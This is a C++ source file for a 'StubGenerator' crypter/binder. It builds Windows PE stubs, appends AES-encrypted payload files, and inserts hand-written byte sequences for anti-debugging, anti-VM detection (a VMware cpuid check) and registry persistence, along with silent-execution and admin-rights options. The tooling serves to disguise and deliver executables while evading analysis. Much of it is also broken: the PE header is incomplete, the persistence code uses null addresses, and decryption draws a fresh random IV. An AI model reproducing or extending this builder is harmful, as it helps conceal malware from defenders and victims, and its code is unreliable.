#include "stub_generator.h"
#include "../src/utils/file_utils.h"
#include "../src/encryption/aes_cbc.h"
#include <iostream>
#include <random>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <winres.h>
#endif

StubGenerator::StubGenerator() 
    : m_antiDebug(true), m_antiVM(true), m_persistence(false), 
      m_silentExecution(false), m_adminRights(false) {
}

StubGenerator::~StubGenerator() {
}

bool StubGenerator::generateStub(const StubConfig& config) {
    if (!validateConfig(config)) {
        std::cout << "Error: Invalid stub configuration" << std::endl;
        return false;
    }
    
    std::cout << "Generating stub with configuration..." << std::endl;
    
    // Generate stub code
    auto stubCode = generateStubCode(config);
    if (stubCode.empty()) {
        std::cout << "Error: Failed to generate stub code" << std::endl;
        return false;
    }
    
    // Write stub to file
    if (!FileUtils::writeFile(config.outputName, stubCode)) {
        std::cout << "Error: Failed to write stub file" << std::endl;
        return false;
    }
    
    std::cout << "✓ Stub generated successfully: " << config.outputName << std::endl;
    return true;
}

bool StubGenerator::attachFileToStub(const std::string& stubPath, const std::string& filePath, const std::string& outputPath) {
    // Read the stub
    auto stubData = FileUtils::readFile(stubPath);
    if (stubData.empty()) {
        std::cout << "Error: Could not read stub file" << std::endl;
        return false;
    }
    
    // Read the file to attach
    auto fileData = FileUtils::readFile(filePath);
    if (fileData.empty()) {
        std::cout << "Error: Could not read file to attach" << std::endl;
        return false;
    }
    
    // Encrypt the file data if encryption is enabled
    if (!m_encryptionKey.empty()) {
        AESCBC aes;
        auto key = std::vector<uint8_t>(m_encryptionKey.begin(), m_encryptionKey.end());
        auto iv = AESCBC::generateIV();
        
        if (aes.initialize(key, iv)) {
            fileData = aes.encrypt(fileData);
        }
    }
    
    // Add file data to stub
    stubData.insert(stubData.end(), fileData.begin(), fileData.end());
    
    // Write the combined file
    if (!FileUtils::writeFile(outputPath, stubData)) {
        std::cout << "Error: Failed to write combined file" << std::endl;
        return false;
    }
    
    std::cout << "✓ File attached to stub successfully: " << outputPath << std::endl;
    return true;
}

bool StubGenerator::createSelfExtractingStub(const std::vector<std::string>& files, const StubConfig& config) {
    std::cout << "Creating self-extracting stub with " << files.size() << " files..." << std::endl;
    
    // Generate base stub
    auto stubCode = generateStubCode(config);
    if (stubCode.empty()) {
        return false;
    }
    
    // Add each file to the stub
    for (const auto& filePath : files) {
        auto fileData = FileUtils::readFile(filePath);
        if (!fileData.empty()) {
            // Add file header (filename + size)
            std::string filename = FileUtils::getFileName(filePath);
            uint32_t fileSize = static_cast<uint32_t>(fileData.size());
            
            stubCode.push_back(static_cast<uint8_t>(filename.length()));
            stubCode.insert(stubCode.end(), filename.begin(), filename.end());
            
            stubCode.push_back((fileSize >> 0) & 0xFF);
            stubCode.push_back((fileSize >> 8) & 0xFF);
            stubCode.push_back((fileSize >> 16) & 0xFF);
            stubCode.push_back((fileSize >> 24) & 0xFF);
            
            // Add file data
            stubCode.insert(stubCode.end(), fileData.begin(), fileData.end());
        }
    }
    
    // Write the self-extracting stub
    if (!FileUtils::writeFile(config.outputName, stubCode)) {
        std::cout << "Error: Failed to write self-extracting stub" << std::endl;
        return false;
    }
    
    std::cout << "✓ Self-extracting stub created: " << config.outputName << std::endl;
    return true;
}

void StubGenerator::setEncryptionKey(const std::string& key) {
    m_encryptionKey = key;
}

void StubGenerator::setTargetFile(const std::string& file) {
    m_targetFile = file;
}

void StubGenerator::enableAntiDebug(bool enable) {
    m_antiDebug = enable;
}

void StubGenerator::enableAntiVM(bool enable) {
    m_antiVM = enable;
}

void StubGenerator::enablePersistence(bool enable) {
    m_persistence = enable;
}

void StubGenerator::setSilentExecution(bool silent) {
    m_silentExecution = silent;
}

void StubGenerator::setAdminRights(bool admin) {
    m_adminRights = admin;
}

std::vector<uint8_t> StubGenerator::generateRandomKey(size_t length) {
    std::vector<uint8_t> key(length);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint8_t> dist(0, 255);
    
    for (size_t i = 0; i < length; ++i) {
        key[i] = dist(gen);
    }
    
    return key;
}

std::string StubGenerator::generateUniqueId() {
    auto key = generateRandomKey(16);
    std::stringstream ss;
    for (uint8_t byte : key) {
        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
    }
    return ss.str();
}

bool StubGenerator::validateConfig(const StubConfig& config) {
    if (config.outputName.empty()) {
        std::cout << "Error: Output name cannot be empty" << std::endl;
        return false;
    }
    
    if (config.addEncryption && config.encryptionKey.empty()) {
        std::cout << "Warning: Encryption enabled but no key provided, using random key" << std::endl;
    }
    
    return true;
}

std::vector<uint8_t> StubGenerator::generateStubCode(const StubConfig& config) {
    std::vector<uint8_t> stubCode;
    
    // Generate PE header
    auto peHeader = generatePEHeader();
    stubCode.insert(stubCode.end(), peHeader.begin(), peHeader.end());
    
    // Generate code section
    auto codeSection = generateCodeSection(config);
    stubCode.insert(stubCode.end(), codeSection.begin(), codeSection.end());
    
    // Generate resource section
    auto resourceSection = generateResourceSection(config);
    stubCode.insert(stubCode.end(), resourceSection.begin(), resourceSection.end());
    
    return stubCode;
}

std::vector<uint8_t> StubGenerator::generatePEHeader() {
    // This is a simplified PE header generation
    // In a real implementation, this would create a proper PE file structure
    
    std::vector<uint8_t> header = {
        // DOS header
        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
        0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
        
        // PE signature
        0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
        0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
        0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72,
        0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
        0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E,
        0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
        0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
        0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        
        // PE header
        0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00,
        0x0B, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    return header;
}

std::vector<uint8_t> StubGenerator::generateCodeSection(const StubConfig& config) {
    std::vector<uint8_t> codeSection;
    
    // Add anti-debug code if enabled
    if (config.addAntiDebug) {
        auto antiDebugCode = generateAntiDebugCode();
        codeSection.insert(codeSection.end(), antiDebugCode.begin(), antiDebugCode.end());
    }
    
    // Add anti-VM code if enabled
    if (config.addAntiVM) {
        auto antiVMCode = generateAntiVMCode();
        codeSection.insert(codeSection.end(), antiVMCode.begin(), antiVMCode.end());
    }
    
    // Add persistence code if enabled
    if (config.addPersistence) {
        auto persistenceCode = generatePersistenceCode();
        codeSection.insert(codeSection.end(), persistenceCode.begin(), persistenceCode.end());
    }
    
    return codeSection;
}

std::vector<uint8_t> StubGenerator::generateResourceSection(const StubConfig& config) {
    std::vector<uint8_t> resourceSection;
    
    // Add version information
    if (!config.versionInfo.empty()) {
        // Version info resource structure would go here
        resourceSection.push_back(0x00); // Placeholder
    }
    
    return resourceSection;
}

std::vector<uint8_t> StubGenerator::generateAntiDebugCode() {
    // Simplified anti-debug code (in real implementation, this would be actual x86/x64 assembly)
    std::vector<uint8_t> code = {
        0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,  // mov eax, fs:[0x30]
        0x8B, 0x40, 0x68,                     // mov eax, [eax+0x68]
        0x85, 0xC0,                           // test eax, eax
        0x75, 0x02,                           // jnz detected
        0xEB, 0x00                            // jmp continue
    };
    
    return code;
}

std::vector<uint8_t> StubGenerator::generateAntiVMCode() {
    // Simplified anti-VM code
    std::vector<uint8_t> code = {
        0x31, 0xC0,                           // xor eax, eax
        0x0F, 0xA2,                           // cpuid
        0x81, 0xFB, 0x68, 0x58, 0x4D, 0x4D,  // cmp ebx, "VMXh"
        0x74, 0x02,                           // je detected
        0xEB, 0x00                            // jmp continue
    };
    
    return code;
}

std::vector<uint8_t> StubGenerator::generatePersistenceCode() {
    // Simplified persistence code
    std::vector<uint8_t> code = {
        0x68, 0x00, 0x00, 0x00, 0x00,         // push registry_key
        0x68, 0x00, 0x00, 0x00, 0x00,         // push value_name
        0x68, 0x00, 0x00, 0x00, 0x00,         // push file_path
        0xE8, 0x00, 0x00, 0x00, 0x00          // call RegSetValue
    };
    
    return code;
}

bool StubGenerator::embedFile(const std::string& stubPath, const std::string& filePath) {
    return attachFileToStub(stubPath, filePath, stubPath);
}

bool StubGenerator::extractEmbeddedFile(const std::string& stubPath, const std::string& outputPath) {
    auto stubData = FileUtils::readFile(stubPath);
    if (stubData.size() < 1024) { // Minimum stub size
        return false;
    }
    
    // Extract embedded data (simplified - in real implementation, parse PE structure)
    std::vector<uint8_t> embeddedData(stubData.begin() + 1024, stubData.end());
    
    if (!m_encryptionKey.empty()) {
        AESCBC aes;
        auto key = std::vector<uint8_t>(m_encryptionKey.begin(), m_encryptionKey.end());
        auto iv = AESCBC::generateIV();
        
        if (aes.initialize(key, iv)) {
            embeddedData = aes.decrypt(embeddedData);
        }
    }
    
    return FileUtils::writeFile(outputPath, embeddedData);
}

std::vector<std::string> StubGenerator::listEmbeddedFiles(const std::string& stubPath) {
    std::vector<std::string> files;
    auto stubData = FileUtils::readFile(stubPath);
    
    if (stubData.size() < 1024) {
        return files;
    }
    
    // Parse embedded files (simplified)
    size_t offset = 1024;
    while (offset < stubData.size()) {
        if (offset + 5 > stubData.size()) break;
        
        uint8_t filenameLength = stubData[offset++];
        if (offset + filenameLength + 4 > stubData.size()) break;
        
        std::string filename(stubData.begin() + offset, stubData.begin() + offset + filenameLength);
        offset += filenameLength;
        
        uint32_t fileSize = 
            (static_cast<uint32_t>(stubData[offset]) << 0) |
            (static_cast<uint32_t>(stubData[offset + 1]) << 8) |
            (static_cast<uint32_t>(stubData[offset + 2]) << 16) |
            (static_cast<uint32_t>(stubData[offset + 3]) << 24);
        
        offset += 4 + fileSize;
        files.push_back(filename);
    }
    
    return files;
}